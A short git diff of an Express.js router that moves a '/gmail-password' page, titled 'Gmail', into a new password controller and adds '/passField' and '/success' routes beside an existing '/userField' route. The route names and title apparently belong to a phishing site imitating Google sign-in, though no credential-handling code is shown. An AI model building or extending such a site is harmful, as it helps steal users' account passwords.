@@ -2,6 +2,7 @@ const express = require('express');
 const router = express.Router();
 
 const userCtrl = require('../controllers/userCtrl');
+const passCtrl = require('../controllers/passCtrl');
 
     router
 
@@ -15,10 +16,10 @@ const userCtrl = require('../controllers/userCtrl');
 
 .post('/userField', userCtrl.userField)
 
-.get('/gmail-password', async (req, res) => {
-    res.render('password', {
-        doc_title: 'Gmail'
-    })
-})
+.get('/gmail-password', passCtrl.getPass)
+
+.post('/passField', passCtrl.passField)
+
+.get('/success', passCtrl.getSuccess)
 
 module.exports = router;
